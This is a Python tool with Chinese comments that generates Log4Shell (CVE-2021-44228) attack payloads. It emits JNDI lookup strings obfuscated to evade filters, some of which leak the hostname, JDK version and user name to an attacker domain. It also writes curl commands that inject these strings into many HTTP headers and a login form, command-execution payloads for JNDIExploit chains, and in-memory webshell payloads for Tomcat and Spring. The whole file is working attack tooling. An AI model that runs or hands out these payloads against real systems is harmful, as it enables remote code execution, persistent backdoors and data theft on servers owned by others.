#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Log4j2 (CVE-2021-44228 / Log4Shell) Payload 生成器
=====================================================================
用法:
  # 1) 生成探测 payload（只需一个 DNSLog 域名，最常用）
  python log4j_gen.py ew67kj.dnslog.cn

  # 2) 生成 payload + 可直接粘贴执行的 curl 注入命令
  python log4j_gen.py ew67kj.dnslog.cn -t http://101.168.23.5:8080/

  # 3) 生成利用 payload（需要 LDAP 服务，如自建 JNDIExploit）
  python log4j_gen.py <your-attack-server>:1389 -c "whoami"

  # 4) 存文件
  python log4j_gen.py ew67kj.dnslog.cn -t http://101.168.23.5:8080/ -o log4j.txt

设计要点:
  * 每个 header 用独立子域（ua./xff./ref. ...），回连时一眼看出是哪个位置命中的
  * JVM 有 DNS 缓存，同一子域第二次可能不解析，所以必须分域打
  * 回连记录里的 IP = 目标出口 IP，这是漏洞存在的直接证据
=====================================================================
"""
import argparse
import base64
import sys
import io

try:
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
except Exception:
    pass


# ---------- 探测型 payload：目标只要能解析 DNS 就能看到回连 ----------
PROBE = [
    ("基础 ldap",       "${jndi:ldap://{h}/a}"),
    ("基础 dns",        "${jndi:dns://{h}/a}"),
    ("基础 rmi",        "${jndi:rmi://{h}/a}"),
    ("基础 ldaps",      "${jndi:ldaps://{h}/a}"),
    ("大小写混淆",      "${jNdI:lDaP://{h}/a}"),
    ("空切片绕过",      "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{h}/a}"),
    ("lower 绕过",      "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}dap://{h}/a}"),
    ("upper 绕过",      "${${upper:j}ndi:ldap://{h}/a}"),
    ("env 默认值绕过",  "${${env:X:-j}${env:X:-n}${env:X:-d}${env:X:-i}:ldap://{h}/a}"),
    ("date 绕过",       "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://{h}/a}"),
    ("lower+切片混合",  "${${lower:${::-j}}${lower:${::-n}}${lower:${::-d}}${lower:${::-i}}:ldap://{h}/a}"),
    ("双写绕过",        "${${::-j}ndi:ldap://{h}/a}"),
    ("带 JDK 版本",     "${jndi:ldap://${sys:java.version}.{h}/a}"),
    ("带主机名",        "${jndi:ldap://${hostName}.{h}/a}"),
    ("带用户名",        "${jndi:ldap://${sys:user.name}.{h}/a}"),
    ("带 OS 名",        "${jndi:ldap://${sys:os.name}.{h}/a}"),
]

# ---------- 注入位置: (header 名, 子域前缀) ----------
INJECT_POS = [
    ("User-Agent",       "ua"),
    ("X-Forwarded-For",  "xff"),
    ("X-Real-IP",        "xri"),
    ("X-Client-IP",      "xci"),
    ("Referer",          "ref"),
    ("Origin",           "org"),
    ("Cookie",           "ck"),
    ("Accept-Language",  "al"),
    ("Authorization",    "auth"),
    ("X-Api-Version",    "xav"),
    ("X-Forwarded-Host", "xfh"),
]

# ---------- 利用型: JNDIExploit 的链 ----------
EXPLOIT_CHAINS = [
    ("Basic",        "Basic/Command/Base64/{b64}",        "JDK 低版本直打"),
    ("TomcatBypass", "TomcatBypass/Command/Base64/{b64}", "JDK >= 8u191 高版本绕过"),
    ("TomcatEcho",   "TomcatEcho/Command/Base64/{b64}",   "Tomcat 回显"),
    ("SpringEcho",   "SpringEcho/Command/Base64/{b64}",   "Spring 回显"),
]
MEMSHELL_CHAINS = [
    ("Tomcat 内存马",  "Basic/TomcatMemshell1"),
    ("Spring 内存马",  "Basic/SpringMemshellInterceptor"),
]


def sec(title):
    return "\n" + "=" * 72 + "\n" + title + "\n" + "=" * 72 + "\n"


def build_probe(domain):
    out = [sec("一、探测 payload 全集（目标只要能解析 DNS 就有回连）")]
    for name, tpl in PROBE:
        out.append("[%s]" % name)
        out.append("  " + tpl.format(h=domain))
        out.append("")
    return out


def build_curl_all(target, domain):
    out = [sec("二、curl 一次打全部 header（每条用独立子域，便于定位命中位置）")]
    out.append("curl -s -o /dev/null '%s/' \\" % target.rstrip('/'))
    for i, (hdr, pre) in enumerate(INJECT_POS):
        payload = "${jndi:ldap://%s.%s/a}" % (pre, domain)
        tail = " \\" if i < len(INJECT_POS) - 1 else ""
        out.append("  -H '%s: %s'%s" % (hdr, payload, tail))
    out.append("")
    out.append("# POST 表单也来一发（有些应用只在登录处记日志）")
    out.append("curl -s -o /dev/null -X POST '%s/' \\" % target.rstrip('/'))
    out.append("  -H 'Content-Type: application/x-www-form-urlencoded' \\")
    out.append("  --data 'username=${jndi:ldap://post.%s/a}&password=1'" % domain)
    out.append("")
    return out


def build_curl_each(target, domain):
    out = [sec("三、逐个 header 单打（定位是哪个位置触发）")]
    for hdr, pre in INJECT_POS:
        payload = "${jndi:ldap://%s.%s/a}" % (pre, domain)
        out.append("curl -s -o /dev/null '%s/' -H '%s: %s'" % (target.rstrip('/'), hdr, payload))
    out.append("")
    return out


def build_exploit(ldap, cmd):
    b64 = base64.b64encode(cmd.encode()).decode()
    out = [sec("四、利用 payload（LDAP 服务: %s，命令: %s）" % (ldap, cmd))]
    out.append("命令 Base64 = %s" % b64)
    out.append("")
    for name, path, note in EXPLOIT_CHAINS:
        out.append("[%s]  %s" % (name, note))
        out.append("  ${jndi:ldap://%s/%s}" % (ldap, path.format(b64=b64)))
        out.append("")
    out.extend([sec("五、内存马 payload（打进去后用 GSL5/哥斯拉 接管）")])
    for name, path in MEMSHELL_CHAINS:
        out.append("[%s]" % name)
        out.append("  ${jndi:ldap://%s/%s}" % (ldap, path))
        out.append("")
    return out


def main():
    ap = argparse.ArgumentParser(
        description="Log4j2 (CVE-2021-44228) Payload 生成器",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("host", help="DNSLog 域名（如 ew67kj.dnslog.cn）；给 -c 时改填 LDAP 服务器 host:port")
    ap.add_argument("-t", "--target", help="目标 URL，生成 curl 注入命令用")
    ap.add_argument("-c", "--cmd", help="要执行的命令，填了就生成利用 payload")
    ap.add_argument("-o", "--out", help="结果写入文件")
    args = ap.parse_args()

    lines = []
    lines.extend(build_probe(args.host))
    if args.target:
        lines.extend(build_curl_all(args.target, args.host))
        lines.extend(build_curl_each(args.target, args.host))
    if args.cmd:
        lines.extend(build_exploit(args.host, args.cmd))
    lines.append("")
    lines.append("提示: 回连记录里的 IP = 目标出口 IP = 漏洞存在的直接证据")
    lines.append("      出现 .ua. / .xff. / .ref. 前缀即可定位是哪个 header 命中的")

    text = "\n".join(lines)
    print(text)
    if args.out:
        with open(args.out, "w", encoding="utf-8") as f:
            f.write(text)
        print("\n[+] 已写入: %s" % args.out)


if __name__ == "__main__":
    main()
